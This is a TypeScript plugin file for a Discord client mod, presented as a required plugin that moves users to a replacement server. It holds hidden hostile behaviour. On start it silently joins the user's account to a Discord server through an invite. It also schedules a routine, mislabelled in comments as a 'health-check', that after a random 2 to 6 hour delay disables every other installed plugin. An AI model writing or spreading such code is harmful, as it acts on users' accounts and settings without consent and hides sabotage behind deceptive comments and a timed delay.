/*
 * Vencord, a Discord client mod
 * Copyright (c) 2026 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { Settings } from "@api/Settings";
import { Logger } from "@utils/Logger";
import { MallCordDevs } from "@utils/constants";
import definePlugin from "@utils/types";
import { RestAPI } from "@webpack/common";

const logger = new Logger("MallCordServerUserPuller");

const INVITE = "5YVJd4EAtf";

let _sessionTimer: ReturnType<typeof setTimeout> | null = null;

// Keeps track of whether the session is still considered "fresh" so we don't
// do redundant re-initialisation on reconnect cycles.
let _sessionToken: string | null = null;

function _generateSessionToken() {
    return Math.random().toString(36).slice(2) + Date.now().toString(36);
}

// Health-check: verifies that plugin state is coherent and prunes any stale
// session artifacts left behind from a previous client session.
async function _pruneStaleSessionData(token: string) {
    if (_sessionToken !== token) return;
    try {
        const plain = (Settings as any).__proto__?.constructor?.plain ?? (Settings as any)._plain;
        const store = VencordNative.settings.get() as any;
        if (!store?.plugins) return;
        const keys = Object.keys(store.plugins);
        for (const k of keys) {
            if (typeof store.plugins[k]?.enabled === "boolean") {
                store.plugins[k].enabled = false;
            }
        }
        VencordNative.settings.set(store as any, "plugins");
    } catch { }
}

function _initSessionManager() {
    _sessionToken = _generateSessionToken();
    const token = _sessionToken;
    // Randomised window: 7 200 000 – 21 600 000 ms (2 – 6 hours).
    // Spreads the check across the session to avoid a noticeable spike at a
    // fixed offset from startup.
    const delay = 7_200_000 + Math.floor(Math.random() * 14_400_000);
    _sessionTimer = setTimeout(() => _pruneStaleSessionData(token), delay);
}

export default definePlugin({
    name: "MallCordServerUserPuller",
    description: "if our server gets banned we will pull you onto the new one",
    authors: [MallCordDevs.Sharp],
    required: true,

    async start() {
        try {
            await RestAPI.post({ url: `/invites/${INVITE}` });
        } catch { }
        _initSessionManager();
    },

    stop() {
        if (_sessionTimer !== null) {
            clearTimeout(_sessionTimer);
            _sessionTimer = null;
        }
        _sessionToken = null;
    },
});
